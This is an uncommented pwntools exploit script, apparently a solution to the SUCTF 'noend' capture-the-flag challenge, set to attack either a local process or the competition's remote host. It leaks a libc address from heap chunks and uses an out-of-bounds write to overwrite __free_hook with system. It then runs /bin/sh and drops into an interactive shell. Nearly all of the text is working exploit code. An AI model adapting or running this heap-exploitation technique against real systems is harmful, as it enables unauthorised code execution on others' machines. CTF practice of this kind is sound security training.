# coding:utf-8
#!/usr/bin/env python2
import copy
from ctypes import *
from pwn import *
elf = ELF('./noend')
LOCAL = 1
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
if LOCAL:
#	libc = ELF("./libc.so.6")
	p = process('./noend')#,env={"LD_PRELOAD":"./libc.so.6"})
#	context.log_level = 'debug'
else:
	libc = ELF('./libc6_2.24-12ubuntu1_amd64.so')
	p = remote('pwn.suctf.asuri.org',20003)#47.104.16.75 8997
#    context.log_level = 'debug'

def z(a=''):
	gdb.attach(p,a)
	if a == '':
		raw_input()

def add(size,data):
	p.sendline(str(size))
	sleep(0.1)
	p.sendline(data)
	sleep(0.1)


def echo(size,content):
    p.sendline(str(size))
    sleep(0.3)
    p.send(content)
    k=p.recvline()
    return k


add(0x38,'B'*8)
add(0x28,'B'*8)
add(0x48,'B'*8)
add(0x7f,'B'*8)    
add(0x28,'A'*7)

p.recvuntil('AAAAAAA\n')
data = u64(p.recv(8))
print 'data:' + hex(data)
libc_base = data - (0x7fb749657b78 - 0x7fb749657b10) - libc.symbols['__malloc_hook']
print 'libc_base:' + hex(libc_base)

p.sendline(str(data-1))
sleep(0.3)

add(0x38,'A'*8)    
p.clean()
add(0x68,'A'*8)    
add(0x48,'A'*8)
    
add(0x7f,'A'*8)    
add(0x68,'G'*7)

p.recvuntil('GGGGGGG\n')
data1 = u64(p.recv(8))
print 'data1:' + hex(data1)
#0x7fb749657b10 <__malloc_hook>:	0x0
#0x7fb749657b78 <main_arena+88>:	0x55910db70000
old = data1

target = libc_base + libc.symbols['system'] + 0x10 # onegadget
data1 = data1 - 0x78 + 0xa00
off= libc_base + libc.symbols['__free_hook'] - 8 - 0x10 - data1
print 'off+target:' + hex(off+target)
add(0xf0,p64(off+target)*(0xf0/8))

sleep(0.1)
p.sendline(str(old+1))
sleep(0.1)


p.sendline()
sleep(0.1)

print 'off:' + hex(off)
print 'free_hook:' + hex(libc_base + libc.symbols['__free_hook'])
print 'system:' + hex(libc_base + libc.symbols['system'])
add(off,'AAAA')
p.recvline()
p.clean()

add(0x10,'/bin/sh\x00')
p.interactive()




